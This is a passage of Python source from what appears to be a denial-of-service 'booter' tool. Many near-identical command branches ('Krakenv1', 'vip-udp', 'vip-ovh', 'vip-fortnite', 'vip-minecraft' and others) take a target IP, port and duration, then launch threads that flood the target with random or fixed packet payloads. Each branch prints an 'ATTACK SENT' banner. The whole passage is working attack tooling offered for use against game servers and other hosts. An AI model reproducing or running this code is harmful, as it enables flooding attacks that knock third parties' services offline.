║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [HITALLV2]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "Krakenv1":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [KRAKENV1]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "Krakenv2":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [KRAKENV2]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vip-tcp":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-TCP]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vip-random":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-RANDOM]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vip-udp":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-UDP]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vip-syn":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-SYN]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vip-std":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-STD]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vip-ovh":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-OVH]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vip-ack":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-ACK]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vip-dns":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-DNS]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vip-forza":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-FORZA]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vip-apex":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-APEX]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vip-fortnite":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-FORTNITE]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vip-COD":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-COD]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vip-gta":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-GTA]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vip-minecraft":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
